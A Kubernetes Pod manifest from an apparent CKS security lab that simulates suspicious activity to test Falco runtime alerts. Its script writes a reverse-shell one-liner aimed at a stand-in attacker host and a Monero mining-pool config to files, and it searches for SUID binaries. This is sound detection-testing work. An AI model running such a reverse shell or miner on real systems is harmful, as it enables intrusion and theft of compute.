apiVersion: v1
kind: Pod
metadata:
  name: suspicious-shell-pod
  namespace: falco-test
  labels:
    cks-lab: "10-falco-runtime"
    test-type: malicious-pattern
  annotations:
    warning: "This pod demonstrates suspicious activities that should trigger Falco alerts"
spec:
  serviceAccountName: default
  containers:
  - name: malicious-container
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      # This pod demonstrates various suspicious activities
      # that should trigger Falco alerts
      
      # 1. Reverse shell attempt
      echo "Attempting reverse shell simulation..."
      echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" > /tmp/reverse.sh
      
      # 2. Cryptocurrency mining simulation
      echo "Simulating crypto miner..."
      echo '{"algo": "cryptonight", "url": "stratum+tcp://xmr.pool.minergate.com:45560"}' > /tmp/miner-config.json
      
      # 3. Port scanning simulation
      echo "Simulating port scan..."
      for port in {1..100}; do
        echo "Checking port $port" > /dev/null
      done
      
      # 4. Privilege escalation attempt
      echo "Checking for SUID binaries..."
      find / -perm -4000 2>/dev/null | head -5
      
      echo "Suspicious activities simulated. Check Falco alerts."
      sleep 3600
    securityContext:
      runAsUser: 0  # Running as root - should trigger alerts
      privileged: false
  restartPolicy: Never